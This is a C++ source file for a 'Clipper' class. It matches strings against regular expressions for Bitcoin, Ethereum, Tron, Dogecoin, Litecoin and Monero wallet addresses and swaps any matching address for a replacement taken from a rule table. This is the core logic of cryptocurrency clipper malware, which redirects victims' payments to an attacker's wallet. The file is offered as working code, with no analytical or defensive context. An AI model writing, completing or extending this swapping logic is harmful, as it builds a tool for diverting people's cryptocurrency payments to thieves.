#include "clipper.h"
#include <regex>
#include <algorithm>
#include <cctype>

Clipper::Clipper() {}

void Clipper::addRule(const std::string& original, const std::string& replacement) {
    rules[original] = replacement;
}

void Clipper::setRules(const std::unordered_map<std::string, std::string>& newRules) {
    rules = newRules;
}

std::string Clipper::processAddress(const std::string& address) {
    std::string normalized = normalizeAddress(address);
    if (!isCryptoAddress(normalized)) return address;
    auto it = rules.find(normalized);
    if (it != rules.end()) {
        return it->second;
    }
    return address;
}

std::unordered_map<std::string, std::string> Clipper::getRules() const {
    return rules;
}

bool Clipper::isCryptoAddress(const std::string& addr) {
    static std::regex btcLegacy("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$");
    static std::regex btcSegwit("^bc1[a-zA-HJ-NP-Z0-9]{39,59}$");
    static std::regex eth("^0x[a-fA-F0-9]{40}$");
    static std::regex tron("^T[a-zA-Z0-9]{33}$");
    static std::regex doge("^D[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$");
    static std::regex ltc("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$");
    static std::regex xmr("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{94}$");
    return std::regex_match(addr, btcLegacy) ||
           std::regex_match(addr, btcSegwit) ||
           std::regex_match(addr, eth) ||
           std::regex_match(addr, tron) ||
           std::regex_match(addr, doge) ||
           std::regex_match(addr, ltc) ||
           std::regex_match(addr, xmr);
}

std::string Clipper::normalizeAddress(const std::string& addr) {
    std::string result = addr;
    result.erase(std::remove_if(result.begin(), result.end(), ::isspace), result.end());
    return result;
}